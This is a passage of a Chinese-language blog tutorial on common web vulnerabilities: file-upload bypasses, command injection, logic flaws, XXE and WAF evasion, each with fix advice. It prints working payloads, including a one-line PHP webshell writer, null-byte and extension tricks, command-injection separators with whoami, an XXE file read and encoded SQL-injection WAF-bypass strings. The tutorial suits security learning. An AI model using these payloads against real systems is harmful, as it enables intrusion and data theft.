+<h2 id="文件后缀绕过攻击">文件后缀绕过攻击</h2>
+<p>  服务端代码中限制了某些后缀的文件不允许上传，但是有些 apache 是允许解析其他文件后缀的。</p>
+<p>  例如在 httpd.conf 中配置如下代码</p>
+<pre><code class="highlight-chroma">AddType application/x-httpd-php .php .phtml
+</code></pre>
+<p>  在 Apache 的解析顺序中，是从右到左开始解析文件后缀的，如果最右边的扩展名不可识别，那就继续往左判断，知道遇到可以解析的文件后缀名为止。是所以如果上传的文件类似 1.php.xxxx，因为后缀 xxxx 不可以解析，所以向左解析后缀为 PHP。</p>
+<h2 id="文件类型绕过攻击">文件类型绕过攻击</h2>
+<p>  如果服务端是通过 Content-Type 的值来判断文件的类型，那就可以通过抓包修改 Content-Type 字段绕过的可能。</p>
+<p>  PHP 中还存在相似的文件上传漏洞，函数 getimagessize()可以获取图片的宽高等信息，如果上传的不是图片文件，那么 getimagesize()就获取不到信息，则不允许上传。</p>
+<p>  此时，我们可以将一个图片和一个 WebShell 合并为一个文件</p>
+<pre><code class="highlight-chroma">cat image.png webshell.php &gt; image.php
+</code></pre>
+<h2 id="文件截断绕过攻击">文件截断绕过攻击</h2>
+<p>  阶段类型： PHP %00 截断</p>
+<p>  截断原理： 由于 00 代表结束符，所以会把 00 后面的所有字符删除</p>
+<p>  截断条件：PHP 版本小于 5.3.4，PHP 的 magic_quotes_gpc 为 OFF 状态</p>
+<p>  eg:</p>
+<pre><code class="highlight-chroma">jieduan=1.php%00.jpg
+</code></pre>
+<p>  文件保存到数据库是，%00 会把".jpg"截断，那么文件名就剩下 1.php 了。</p>
+<h2 id="竞争条件攻击">竞争条件攻击</h2>
+<p>  网站上传逻辑是先允许上传任意文件，然后检查上传的为五年间是否包含 WebShell 脚本，如果包含则删除该文件。这里存在一个问题：文件上传成功和删除文件之间存在一个短的时间差（应为要执行检查文件和删除文件的操作），攻击者可以利用这个时间差竞争条件的上传攻击。</p>
+<pre><code class="highlight-chroma">&lt;?php
+ fputs(fopen('../shell.php','w'),'&lt;?php @eval($_POST[a] ?&gt;')
+&gt;
+</code></pre>
+<p>  当 shell 脚本上传后，客户端立即访问该 shell 脚本，这样就利用时间差完成上传。</p>
+<h2 id="文件上传修复建议">文件上传修复建议</h2>
+<ul>
+<li>通过白名单的方式判断文件后缀是否合法</li>
+<li>对上传的文件进行重命名</li>
+</ul>
+<h1 id="暴力破解">暴力破解</h1>
+<p>  暴力破解的产生是由于服务器端没有做限制，导致攻击者可以通过暴力的手段破解所需信息。</p>
+<p>  <strong>修复建议</strong>：</p>
+<ul>
+<li>如果用户登录次数超过设置的阈值，则锁定账号</li>
+<li>如果某个 IP 登录次数超过设置的阈值，则锁定 IP</li>
+</ul>
+<h1 id="命令执行">命令执行</h1>
+<p>  应用程序有时需要调用一些执行系统命令的函数，当黑客可以控制这些函数的参数时，就可以将恶意的系统命令拼接到正常的命令中，草儿执行攻击，这就是命令执行漏洞。<br>
+eg：</p>
+<pre><code class="highlight-chroma">页面提供了ping命令，然后将ping的结果返回到页面上
+将参数IP设置为 ： 127.0.0.1 | dir ，然后再次访问，程序直接将目录结构返回到页面上。
+</code></pre>
+<h2 id="管道符">管道符</h2>
+<p>  Windows 系统支持的管道符</p>
+<table>
+<thead>
+<tr>
+<th>管道符</th>
+<th>意义</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>"</td>
+<td>"</td>
+<td>直接执行后面的语句</td>
+</tr>
+<tr>
+<td>"</td>
+<td></td>
+<td>"</td>
+</tr>
+<tr>
+<td>" &amp; "</td>
+<td>如果前面的语句为假则直接执行后面的语句，前面的语句可真可假</td>
+<td>ping 127.0.0.1 &amp; whoami</td>
+</tr>
+<tr>
+<td>" &amp;&amp; "</td>
+<td>如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真</td>
+<td>ping  127.0.0.1 &amp;&amp; whoami</td>
+</tr>
+</tbody>
+</table>
+<p>  Linux 系统支持的管道符</p>
+<table>
+<thead>
+<tr>
+<th>管道符</th>
+<th>意义</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>" ; "</td>
+<td>执行完前面的语句再执行后面的</td>
+<td>ping 127.0.0.1;whoami</td>
+</tr>
+<tr>
+<td>"</td>
+<td>"</td>
+<td>显示后面的语句的执行结果</td>
+</tr>
+<tr>
+<td>"</td>
+<td></td>
+<td>"</td>
+</tr>
+<tr>
+<td>" &amp; "</td>
+<td>如果前面的语句为假则直接执行后面的语句，前面的语句可真可假</td>
+<td>ping 127.0.0.1 &amp; whoami</td>
+</tr>
+<tr>
+<td>" &amp;&amp; "</td>
+<td>如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真</td>
+<td>ping  127.0.0.1 &amp;&amp; whoami</td>
+</tr>
+</tbody>
+</table>
+<h2 id="修复建议---">修复建议</h2>
+<ul>
+<li>尽量不要使用命令执行函数</li>
+<li>客户端提交的变量在进入执行命令函数前要做好过滤和检测</li>
+<li>在使用动态函数之前，确保使用的函数是指定的函数之一</li>
+<li>对于 PHP 语言来说不能完全控制的危险函数最好不要使用</li>
+</ul>
+<h1 id="逻辑漏洞">逻辑漏洞</h1>
+<p>  逻辑漏洞就是指攻击者利用业务的设计缺陷，获取敏感信息或破坏业务的完整性。</p>
+<p>  越权分为水平越权和垂直越权两种：</p>
+<ul>
+<li>水平越权： 相同级别（权限）的用户或者同一角色中不同用户之间，可以越权访问，修改或者删除其他用户信息的非法操作。</li>
+<li>垂直越权： 不同级别之间的用户或者不同角色之间用户的越权。例如普通用户可以执行只有管理员才能执行的功能。</li>
+</ul>
+<p>  <strong>修复建议</strong></p>
+<ul>
+<li>通过 session 控制</li>
+</ul>
+<h1 id="XXE漏洞">XXE 漏洞</h1>
+<p>  XML 外部实体注入（XML External Entity） 简称 XXE 漏洞。XML 用于标记电子文件使其具有结构性的标记语言，可以用来标记数据，定义数据类型，是一种允许用户对自己的标记语言进行定义的元语言。</p>
+<p>  文档类型定义（DTD）可以是内部声明也可以 D 引用外部 DTD</p>
+<ul>
+<li>内部声明 DTD 格式 :</li>
+</ul>
+<pre><code class="highlight-chroma"> &lt;!DOCTYPE 根元素 [元素声明]&gt;
+</code></pre>
+<ul>
+<li>引入外部 DTD 格式：</li>
+</ul>
+<pre><code class="highlight-chroma">&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;
+</code></pre>
+<p>  在 DTD 中进行实体声明时，将使用 ENTITY 关键字来声明。实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体可在外部或内部进行声明。</p>
+<ul>
+<li>内部声明实体格式：</li>
+</ul>
+<pre><code class="highlight-chroma">&lt;!ENTITY 实体名称 “实体的值”&gt;
+</code></pre>
+<ul>
+<li>引用外部实体格式：</li>
+</ul>
+<pre><code class="highlight-chroma">&lt;!ENTITY 实体名称 SYSTEM ”URL“&gt;
+</code></pre>
+<p>  eg:</p>
+<pre><code class="highlight-chroma">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE a [
+ &nbsp;&lt;!ENTITY b SYSTEM "file:///c:/windows/win.ini"&gt;
+]&gt;
+&lt;xml&gt;
+&lt;xxe&gt;&amp;b;&lt;/xee&gt;
+&lt;/xml&gt;
+</code></pre>
+<p>  <strong>修复建议</strong></p>
+<ul>
+<li>禁止使用外部实体，eg : libxml_disable_entity_loader(true)</li>
+<li>过滤用户 1 提交的 XML 内容，防止出现非法内容</li>
+</ul>
+<h1 id="WAF">WAF</h1>
+<p>  WAF（Web Application Firewall , Web 应用防火墙）是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。</p>
+<p>  WAF 可以分为以下几类：</p>
+<ol>
+<li>
+<p><strong>软件型 WAF</strong>：以软件形式装在所保护的服务器上的 WAF，由于安装在服务器上，所以可以接触到服务器上的文件，直接检测服务器上是否存在 WebShell 、是否有文件被创建等。</p>
+</li>
+<li>
+<p>**硬件型 WAF：**以硬件形式部署在链路中，支持多种部署方式，当串联到链路中时可以拦截恶 意流量，在旁路监昕模式时只记录攻击不进行拦截。</p>
+</li>
+<li>
+<p>**云 WAF：**一般以反向代理的形式工作，通过配置 NS 记录或 CNAME 记录，使对网站的请求 报文优先经过 WAF 主机，经过 WAF 主机过滤后，将认为无害的请求报文再发送给实 际网站服务器进行请求，可以说是带防护功能的 CDN。</p>
+</li>
+<li>
+<p>**网站系统内置的 WAF：**网站系统内置的 WAF 也可以说是网站系统中内置的过滤，直接镶嵌在代码中， 相对来说自由度高。一般有以下这几种情况：</p>
+<ul>
+<li>输入参数强制类型转换（intval 等）。</li>
+<li>输入参数合法性检测。</li>
+<li>关键函数执行（SQL 执行、页面显示、命令执行等）前，对经过代码流程的输入注行检测。</li>
+<li>对输入的数据进行替换过滤后再继续执行代码流程（转义/替换掉特殊字符等）。</li>
+</ul>
+<p>网站系统内置的 WAF 与业务更加契合，在对安全与业务都比较了解的情况下， 可以更少地收到误报与漏报。</p>
+</li>
+</ol>
+<h2 id="WAF判断">WAF 判断</h2>
+<p>  可以通过以下几种方法来判断目标网站中是否存在 WAF：</p>
+<h3 id="通过SQLMap判断">通过 SQLMap 判断</h3>
+<ul>
+<li>使用 SQLMap 中自带的 WAF 识别模块可以识别出 WAF 的种类，但是如果所安下面装的 WAF 并没有什么特征， SQLMap 就只能识别出类型是 Generic</li>
+<li>下面以某卫士官网为例，在 SQLMap 中输入以下命令，结果如下：</li>
+</ul>
+<pre><code class="highlight-chroma">sqlmap.py -u "http://xxx.com" --identify-waf --batch
+</code></pre>
+<h3 id="手工判断">手工判断</h3>
+<p>  这个比较简单，直接在相应网站的 URL 后面加上最基础的测试语句，比如“union select 1,2,3%23”，并且放在一个不存在的参数名中。因为使用不正确的 URL 访问之后可能会触发 WAF 的防护，然后被拦截，拦截的表现为（增加了无影响的测试语句后）：页面无法访问、响应码不同、返回与正常请求网页时不同的结果等。</p>
+<h2 id="绕过WAF">绕过 WAF</h2>
+<ul>
+<li><strong>大小写混合</strong> : 在规则匹配时只针对了特定大写或者特定小写的情况，在实战中可以通过混合大小写的方式进行绕过（现在几乎没有这种情况。<br>
+eg:
+<pre><code class="highlight-chroma">uNIon seLECt 1,2,3,4,5
+</code></pre>
+</li>
+<li><strong>URL 编码</strong> : 极少部分的 WAF 不会对普通字符进行 URL 编码</li>
+</ul>
+<p>  eg:</p>
+<pre><code class="highlight-chroma">%75%4e%49%6f%6e+%73%65%4c%45%43%74+%31%2c%32%2c%33%2c%34%2c%35
+</code></pre>
+<ul>
+<li><strong>URL 二次编码</strong>：WAF 一般只进行一次解码，而如果目标 Web 系统的代码中进行了额外的 URL 解码，即可绕过</li>
+</ul>
+<p>  eg:</p>
+<pre><code class="highlight-chroma">%25%37%35%25%34%65%25%34%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%34%63%25%34%35%25%34%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%63%25%33%35
+</code></pre>
+<ul>
+<li><strong>替换关键字</strong> : WAF 采用替换或者删除 select/union 这类敏感关键词的时候，如果只匹配一次则很容易进行绕过。</li>
+</ul>
+<p>  eg:</p>
+<pre><code class="highlight-chroma">uniunionon select 1,2,3,4,5
+</code></pre>
+<ul>
+<li><strong>使用注释</strong> : 注释在截断 SQL 语句中用的比较多，在绕过 WAF 时主要使用其替代空格（/<em>任意内容</em>/），适用于检测过程中没有识别注释或者替换掉了注释的 WAF。</li>
+</ul>
+<p>  eg:</p>
+<pre><code class="highlight-chroma">union/*2324*/select/*aaa*/1,2,3,4,5
+</code></pre>
+<ul>
+<li><strong>多参数请求拆分</strong> : 对于多个参数拼接到同一条 SQL 语句中的情况，可以将注入语句分割插入</li>
+</ul>
+<p>  eg:</p>
+<pre><code class="highlight-chroma">GET url : a=[input1]&amp;b=[input2]
+    sql: and a=[input1] and b=[input2]
+拆分： url: a=union/*&amp;b=*/select 1,2,3,4
+      sql: and a=union /*and b=*/select 1,2,3,4
+</code></pre>
+<ul>
+<li><strong>HTTP 参数污染</strong> : 参数污染是指当同一参数出现多次，不同的中间件会解析为不同的结果。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>服务器中间件</th>
+<th>解析结果</th>
+<th>举例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ASP.NET /IIS</td>
+<td>所有出现的参数值用逗号连接</td>
+<td>color=red,blue</td>
+</tr>
+<tr>
+<td>ASP/IIS</td>
+<td>所有出现的参数值用逗号连接</td>
+<td>color=red,blue</td>
+</tr>
+<tr>
+<td>PHP / Apache</td>
+<td>仅最后一次出现参数值</td>
+<td>color=blue</td>
+</tr>
+<tr>
+<td>PHP / Zeus</td>
+<td>仅最后一次出现参数值</td>
+<td>color=blue</td>
+</tr>
+<tr>
+<td>JSP, Servlet / Apache Tomcat</td>
+<td>仅第一次出现参数值</td>
+<td>color=red</td>
+</tr>
+<tr>
+<td>JSP, Servlet / Oracle Application Server 10g</td>
+<td>仅第一次出现参数值</td>
+<td>color= red</td>
+</tr>
+<tr>
+<td>JSP, Servlet / Jetty</td>
+<td>仅第一次出现参数值</td>
+<td>color=red</td>
+</tr>
+<tr>
+<td>IBM Lotus Domino</td>
+<td>仅最后一次出现参数值</td>
+<td>color=blue</td>
+</tr>
+<tr>
+<td>IBM HTTP Server</td>
+<td>仅第一次出现参数值</td>
+<td>color= red</td>
+</tr>
+<tr>
+<td>mod perl, libapreq2 / Apache</td>
+<td>仅第一次出现参数值</td>
+<td>color= red</td>
+</tr>
+<tr>
+<td>Perl CGI / Apache</td>
+<td>仅第一次出现参数值</td>
+<td>color=red</td>
+</tr>
+<tr>
+<td>mod wsgi (Python) / Apache</td>
+<td>仅第一次出现参数值</td>
+<td>color=red</td>
+</tr>
+<tr>
+<td>Python / Zope</td>
+<td>转化为 List</td>
+<td>color=['red',blue']</td>
+</tr>
+</tbody>
+</table>
+<p>  IIS 举例：</p>
+<pre><code class="highlight-chroma">Inject = union select 1,2,3,4,5
+转换 ： Inject = union/*&amp;inject=*/select/*&amp;inject=*/1&amp;inject=2&amp;inject=3&amp;inject=4
+最终在IIS中： Inject=union/*,*/select/*,*/1,2,3,4,5
+</code></pre>
+<ul>
+<li><strong>生僻函数</strong> : 使用生僻函数替代常见的函数，例如在报错注入中使用 polygon()函数替换常用的 updatexml()函数。</li>
+</ul>
+<p>  eg:</p>
+<pre><code class="highlight-chroma">select polygon((select*from(selct*from(select@@version)f)x));
+</code></pre>
+<ul>
+<li><strong>寻找网站源码 IP</strong> : 对于具有云 WAF 防护的网站而言，只要找到网站的 IP 地址，然后通过 IP 访问网站，就可以绕过云 WAF 的检测<br>
+常见的寻找网站 IP 的方法如下：
+<ul>
+<li>寻找网站的历史解析记录</li>
+<li>多个不同区域 ping 网站，查看 IP 解析的结果</li>
+<li>找网站的二级域名、 NS、MX 记录等对应的 IP</li>
+<li>订阅网站邮件，查看邮件发送方的 IP</li>
+</ul>
+</li>
+<li><strong>注入参数到 cookies 中</strong> : 某些程序员在代码中使用<span class="vditor-math">*REQUEST获取参数，而</span>*REQUEST 会一次从 GET/POST/cookie 中获取参数，如果 WAF 只检测了 GET/POST 而没有检测 cookie，可以将注入语句放入 cookie 中进行绕过</li>
+</ul>
+                    <div>
+                        <hr>
+
+标题：Web常见漏洞<br>
+作者：<a href="https://ZZUGeneral.github.io" target="_blank">General</a><br>
+地址：<a href="https://ZZUGeneral.github.io/articles/2020/10/12/1602511210520.html" target="_blank">https://ZZUGeneral.github.io/articles/2020/10/12/1602511210520.html</a><br>
+一个没有得到Java开发工作的测试员！
+<!-- 签名档内可使用 HTML、JavaScript -->
+<br>
+                    </div>
+            </section>
+        </div>
+
+    </div>
+        <div class="post__toc">
+<ul class="article__toc">
+        <li class="toc__h1">
+            <a href="#SQL注入">SQL 注入</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#SQL语句">SQL 语句</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#SQL注入基础">SQL 注入基础</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#SQL注入原理">SQL 注入原理</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#相关知识点">相关知识点</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#函数">函数</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#注释符">注释符</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#内联注释">内联注释</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#UNION注入">UNION 注入</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#BOOLEAN注入">BOOLEAN 注入</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#报错注入">报错注入</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#SQL注入进阶">SQL 注入进阶</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#时间注入">时间注入</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#堆叠查询注入">堆叠查询注入</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#二次注入">二次注入</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#宽字节注入">宽字节注入</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#cookie注入">cookie 注入</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#Base64注入">Base64 注入</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#XFF注入">XFF 注入</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#Oracle注入">Oracle 注入</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#注入实例语句">注入实例语句</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#盲注">盲注</a>
+        </li>
+        <li class="toc__h4">
+            <a href="#报错盲注">报错盲注</a>
+        </li>
+        <li class="toc__h4">
+            <a href="#时间盲注">时间盲注</a>
+        </li>
+        <li class="toc__h4">
+            <a href="#外带通信">外带通信</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#SQL注入绕过">SQL 注入绕过</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#SQL注入修复建议1--过滤危险字符-如-采用正则表达式匹配union-sleep-load-file等关键字">SQL 注入修复建议 1. 过滤危险字符。如，采用正则表达式匹配 union,sleep,load_file 等关键字</a>
+        </li>
+        <li class="toc__h1">
+            <a href="#XSS">XSS</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#原理">原理</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#攻击分析">攻击分析</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#XSS进阶">XSS 进阶</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#XSS常用语句和编码绕过">XSS 常用语句和编码绕过</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#修复建议">修复建议</a>
+        </li>
+        <li class="toc__h1">
+            <a href="#CSRF">CSRF</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#原理-">原理</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#修复建议-">修复建议</a>
+        </li>
+        <li class="toc__h1">
+            <a href="#SSRF">SSRF</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#原理--">原理</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#修复建议--">修复建议</a>
+        </li>
+        <li class="toc__h1">
+            <a href="#文件上传">文件上传</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#JS检测绕过攻击">JS 检测绕过攻击</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#文件后缀绕过攻击">文件后缀绕过攻击</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#文件类型绕过攻击">文件类型绕过攻击</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#文件截断绕过攻击">文件截断绕过攻击</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#竞争条件攻击">竞争条件攻击</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#文件上传修复建议">文件上传修复建议</a>
+        </li>
+        <li class="toc__h1">
+            <a href="#暴力破解">暴力破解</a>
+        </li>
+        <li class="toc__h1">
+            <a href="#命令执行">命令执行</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#管道符">管道符</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#修复建议---">修复建议</a>
+        </li>
+        <li class="toc__h1">
+            <a href="#逻辑漏洞">逻辑漏洞</a>
+        </li>
+        <li class="toc__h1">
+            <a href="#XXE漏洞">XXE 漏洞</a>
+        </li>
+        <li class="toc__h1">
+            <a href="#WAF">WAF</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#WAF判断">WAF 判断</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#通过SQLMap判断">通过 SQLMap 判断</a>
+        </li>
+        <li class="toc__h3">
+            <a href="#手工判断">手工判断</a>
+        </li>
+        <li class="toc__h2">
+            <a href="#绕过WAF">绕过 WAF</a>
+        </li>
+</ul>        </div>
+        <div class="wrapper">
+            <div id="gitalk-container"></div>
+            <div id="vcomment"
+                 style="    margin-bottom: 40px; margin-top: 80px;
+        border: 1px solid rgba(255,255,255,0.8);
+        border-radius: 5px;
+        background: rgba(255,255,255,0.9);
+        box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+        padding: 20px;"
+                 data-name="General" data-postId="1602511210520"></div>
+            <div id="b3logsolocomments"></div>
+        </div>
+    <div class="article__bottom">
+        <div class="wrapper">
+            <div class="fn__flex">
+                <div class="item" id="randomArticles"></div>
+                <div class="item" id="relevantArticles"></div>
+            </div>
+        </div>
+    </div>
+    
+</div>
+<script type="text/javascript"
+        src="https://ZZUGeneral.github.io/skins/Bubble/js/TweenMax.min.js?1602754508835"
+        charset="utf-8"></script>
+<footer class="footer">
+    <div class="wrapper">
+            <a href="https://ld246.com/member/General"
+       title="https://ld246.com/member/General"
+       class="user__site"
+       target="_blank" rel="noopener nofollow">
+        <svg viewBox="0 0 32 32" width="100%" height="100%">
+            <path fill="#d23f31" style="fill: var(--color1, #d23f31)" d="M5.787 17.226h17.033l5.954 9.528c0.47 0.752 0.003 1.361-1.042 1.361h-15.141z"></path>
+            <path d="M10.74 3.927h17.033c1.045 0 1.512 0.609 1.042 1.361l-5.954 9.528h-19.872l6.379-10.209c0.235-0.376 0.849-0.681 1.372-0.681z"></path>
+            <path d="M2.953 17.226h2.839l6.804 10.889h-1.892c-0.523 0-1.137-0.305-1.372-0.681z"></path>
+        </svg>
+    </a>
+
+        <a href="https://github.com/ZZUGeneral"
+           title="https://github.com/ZZUGeneral"
+           class="user__site"
+           target="_blank" rel="noopener nofollow">
+            <svg viewBox="0 0 32 32" width="100%" height="100%">
+                <path d="M16 0.331c-8.836 0-16 7.163-16 16 0 7.069 4.585 13.067 10.942 15.182 0.8 0.148 1.094-0.347 1.094-0.77 0-0.381-0.015-1.642-0.022-2.979-4.452 0.968-5.391-1.888-5.391-1.888-0.728-1.849-1.776-2.341-1.776-2.341-1.452-0.993 0.11-0.973 0.11-0.973 1.606 0.113 2.452 1.649 2.452 1.649 1.427 2.446 3.743 1.739 4.656 1.33 0.143-1.034 0.558-1.74 1.016-2.14-3.554-0.404-7.29-1.777-7.29-7.907 0-1.747 0.625-3.174 1.649-4.295-0.166-0.403-0.714-2.030 0.155-4.234 0 0 1.344-0.43 4.401 1.64 1.276-0.355 2.645-0.532 4.005-0.539 1.359 0.006 2.729 0.184 4.008 0.539 3.054-2.070 4.395-1.64 4.395-1.64 0.871 2.204 0.323 3.831 0.157 4.234 1.026 1.12 1.647 2.548 1.647 4.295 0 6.145-3.743 7.498-7.306 7.895 0.574 0.497 1.085 1.47 1.085 2.963 0 2.141-0.019 3.864-0.019 4.391 0 0.426 0.288 0.925 1.099 0.768 6.354-2.118 10.933-8.113 10.933-15.18 0-8.837-7.164-16-16-16z"></path>
+            </svg>
+        </a>
+
+        <a href="https://www.linkedin.com/in/yhlgeneral"
+           title="https://www.linkedin.com/in/yhlgeneral"
+           target="_blank"
+           class="user__site" rel="noopener nofollow">
+            <svg viewBox="0 0 32 32" width="100%" height="100%">
+                <path d="M4.32 23.443h4.211v-12.651h-4.211v12.651zM8.805 6.891c-0.018-1.24-0.911-2.188-2.352-2.188s-2.388 0.948-2.388 2.188c0 1.203 0.911 2.187 2.333 2.187h0.018c1.477 0 2.388-0.984 2.388-2.187zM19.469 23.443h4.211v-7.255c0-3.883-2.078-5.688-4.849-5.688-2.26 0-3.263 1.258-3.81 2.133h0.036v-1.841h-4.211s0.055 1.185 0 12.651v0h4.211v-7.073c0-0.365 0.018-0.747 0.128-1.021 0.31-0.747 1.003-1.531 2.169-1.531 1.513 0 2.115 1.148 2.115 2.862v6.763zM28 5.25v17.5c0 2.898-2.352 5.25-5.25 5.25h-17.5c-2.898 0-5.25-2.352-5.25-5.25v-17.5c0-2.898 2.352-5.25 5.25-5.25h17.5c2.898 0 5.25 2.352 5.25 5.25z"></path>
+            </svg>
+        </a>
+        <a href="https://weibo.com/18203879479"
+           title="https://weibo.com/18203879479"
+           target="_blank"
+           class="user__site" rel="noopener nofollow">
+            <svg viewBox="0 0 32 32" width="100%" height="100%">
+                <path d="M13.444 27.064c-5.3 0.525-9.875-1.875-10.219-5.35-0.344-3.481 3.675-6.719 8.969-7.244 5.3-0.525 9.875 1.875 10.212 5.35 0.35 3.481-3.669 6.725-8.963 7.244zM24.038 15.521c-0.45-0.137-0.762-0.225-0.525-0.819 0.512-1.287 0.563-2.394 0.006-3.188-1.038-1.481-3.881-1.406-7.137-0.037 0 0-1.025 0.444-0.762-0.363 0.5-1.613 0.425-2.956-0.356-3.737-1.769-1.769-6.469 0.069-10.5 4.1-3.013 3.006-4.763 6.212-4.763 8.981 0 5.287 6.787 8.506 13.425 8.506 8.7 0 14.494-5.056 14.494-9.069 0-2.431-2.044-3.806-3.881-4.375z"></path>
+                <path d="M29.819 5.833c-2.1-2.331-5.2-3.219-8.063-2.612v0c-0.663 0.144-1.081 0.794-0.938 1.45 0.144 0.662 0.788 1.081 1.45 0.938 2.038-0.431 4.238 0.2 5.731 1.856s1.9 3.913 1.256 5.888v0c-0.206 0.644 0.144 1.331 0.788 1.544 0.644 0.206 1.331-0.144 1.544-0.787v-0.006c0.9-2.762 0.331-5.938-1.769-8.269z"></path>
+                <path d="M26.588 8.752c-1.025-1.138-2.538-1.569-3.925-1.269-0.569 0.119-0.931 0.688-0.813 1.256 0.125 0.569 0.688 0.931 1.25 0.806v0c0.681-0.144 1.419 0.069 1.919 0.619 0.5 0.556 0.637 1.313 0.419 1.975v0c-0.175 0.55 0.125 1.15 0.681 1.331 0.556 0.175 1.15-0.125 1.331-0.681 0.438-1.356 0.163-2.906-0.863-4.037z"></path>
+                <path d="M13.738 20.771c-0.188 0.319-0.594 0.469-0.912 0.337-0.319-0.125-0.412-0.488-0.231-0.794 0.188-0.306 0.581-0.456 0.894-0.337 0.313 0.113 0.425 0.469 0.25 0.794zM12.044 22.933c-0.512 0.819-1.613 1.175-2.438 0.8-0.813-0.369-1.056-1.319-0.544-2.119 0.506-0.794 1.569-1.15 2.388-0.806 0.831 0.356 1.1 1.3 0.594 2.125zM13.969 17.146c-2.519-0.656-5.369 0.6-6.463 2.819-1.119 2.262-0.037 4.781 2.506 5.606 2.638 0.85 5.75-0.456 6.831-2.894 1.069-2.394-0.262-4.85-2.875-5.531z"></path>
+            </svg>
+        </a>
+        <a href="https://www.zhihu.com/people/general-54-18"
+           title="https://www.zhihu.com/people/general-54-18"
+           target="_blank"
+           class="user__site" rel="noopener nofollow">
+            <svg viewBox="0 0 32 32" width="100%" height="100%">
+                <path d="M32 26.67c0 2.931-2.382 5.33-5.33 5.33h-21.339c-2.948 0-5.33-2.382-5.33-5.33v-21.339c0-2.948 2.382-5.33 5.33-5.33h21.339c2.948 0 5.33 2.382 5.33 5.33v21.339zM12.358 17.191h4.713c0-1.114-0.531-1.748-0.531-1.748h-4.079c0.103-2.005 0.189-4.576 0.223-5.536h3.874s-0.017-1.645-0.463-1.645h-6.822s0.411-2.142 0.96-3.085c0 0-2.040-0.12-2.742 2.605-0.686 2.725-1.731 4.354-1.851 4.662s0.6 0.137 0.891 0c0.309-0.137 1.663-0.617 2.057-2.537h2.108c0.034 1.2 0.12 4.885 0.086 5.536h-4.336c-0.6 0.446-0.823 1.748-0.823 1.748h4.971c-0.206 1.371-0.566 3.137-1.080 4.062-0.806 1.491-1.234 2.828-4.131 5.176 0 0-0.48 0.36 0.994 0.223 1.474-0.12 2.845-0.514 3.839-2.434 0.514-0.994 1.011-2.28 1.423-3.565l4.079 4.713s0.548-1.268 0.137-2.657l-3.034-3.394-1.028 0.754c0.291-0.994 0.497-1.988 0.548-2.845 0.017 0.017 0.017 0 0.017-0.034zM18.048 7.936v16.3h1.714l0.703 1.954 2.965-1.954h3.754v-16.3h-9.136zM25.401 22.487h-1.937l-2.434 1.611-0.566-1.611h-0.6v-12.735h5.553v12.735h-0.017z"></path>
+            </svg>
+        </a>
+        <a href="tencent://message/?uin=1359541394"
+           title="1359541394"
+           target="_blank"
+           class="user__site" rel="noopener nofollow">
+            <svg viewBox="0 0 32 32" width="100%" height="100%">
